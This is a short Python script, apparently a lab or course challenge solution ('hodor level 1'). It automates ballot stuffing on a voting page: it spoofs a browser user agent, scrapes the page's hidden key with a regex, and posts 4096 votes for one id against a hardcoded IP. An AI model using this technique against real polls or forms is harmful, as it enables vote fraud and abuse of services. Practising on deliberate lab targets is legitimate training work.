#!/usr/bin/python3
"""
hodor level 1
Send 4096 votes to my school id with post request to url
identify the user agent
extract the hidden key/value w/regeix,
though the hidden key may be hardcoded and able to be a constant
"""
import requests
import re

agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0"
datadic = {'id': '1345', 'holdthedoor': 'submit'}
target_url = "http://158.69.76.135/level1.php"
num_votes = 4096
reqs_made = 0
fails = 0
headers = {'User-Agent': agent}
sess = requests.Session()
sess.headers.update(headers)

print("start @ {}".format(reqs_made))
while reqs_made < num_votes and fails < 100:
    try:
        res = sess.get(target_url, headers=headers)
        if res.status_code is not 200:
            continue
        rxget = re.findall("value=\"([^\"]+)\"", res.text)
#        print(rxget[0])
        datadic["key"] = rxget[0]
        res = sess.post(target_url, data=datadic)
        if res.status_code is 200:
            fails = 0
            reqs_made += 1
            print("req {} passed".format(reqs_made))
    except Exception as e:
        print(e)
        fails += 1

print("end w/ {} votes passed from 4096".format(reqs_made))
